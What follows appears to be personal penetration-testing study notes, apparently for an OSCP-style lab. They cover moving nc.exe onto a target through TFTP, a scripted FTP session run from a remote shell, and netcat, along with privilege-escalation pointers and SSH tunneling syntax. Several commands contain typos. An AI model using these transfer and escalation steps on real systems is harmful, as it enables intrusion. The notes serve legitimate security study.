### File transfers

#### TFTP 

   Attacking machine:

  ```Mkdir/tftp```

  ```atftpd –daemon –port 69 /tftp```

  ```cp /usr/share/windows-binaries/nc.exe.tftp/```

   Target
    
    ```tftp -i 10.11.0.5 get nc.exe```

#### FTP

   Can be made non-interactive by providing the ftp.exe with a text file containing the commands to be executed

   Use the following via remote shell to download

  ```Echo open 10.11.0.5 21> ftp.txt```

  ```Echo USER offsec>> ftp.txt```

  ```Echo ftp>> ftp.txt```

  ```Echo bin>> ftp.txt```

  ```Echo GET nc.exe >> ftp.txt```

  ```Echo bye >> ftp.txt```

  ```ftp -v -n -s:ftp.txt```

#### Netcat

   On server machine: ```nc -nlvp 4444 > incoming.exe```

   On client machine: ```nc – nv 10.11.23.33 4444 < incoming.exe```
   
### Privilege escalation

  Linux example: CVE 2012-0056

  Windows example: MS11-080
  
#### Windows

##### XP/2003

Look for programs in the dock running as SYSTEM 

Click to open file dialogue.  Find cmd.exe and open; you'll get a cmd prompt as SYSTEM.

Shatter attacks.  (research and fill in)

##### Windows 7

Incorrect permission, i.e. programs giving full write privileges to all users.  You can then modify files in the directory to execute malicious code.

### Tunneling

#### SSH tunneling 

   Local port forwarding 

```ssh <gateway> -L <local port to listen>:<remote host>:<remote port>```

   Remote port forwarding

```ssh <gateway> -R <remote port to bind>:<local host>:<local port>```

   Dynamic port forwarding 

```ssh -D <local proxy port> -p <remote port> <target>```

   HTTP tunneling – technique to encapsulate a protocol within HTTP

      HTTPTunnel or stunnel 

